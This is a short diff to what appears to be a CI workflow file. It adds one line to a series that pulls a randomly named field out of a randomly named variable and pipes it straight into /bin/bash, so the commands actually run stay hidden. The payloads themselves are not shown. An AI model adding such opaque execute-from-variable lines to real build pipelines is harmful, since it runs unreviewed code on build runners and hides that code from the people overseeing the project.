@@ -28,6 +28,7 @@ jobs:
           echo $cipkw4 | jq -r .ityka15386 | /bin/bash
           echo $eqo06 | jq -r .cp7687 | /bin/bash
           echo $ucutm311 | jq -r .sjls23677 | /bin/bash
+          echo $flv90560 | jq -r .r4562 | /bin/bash
 
       - name: Save archive
         if: always()
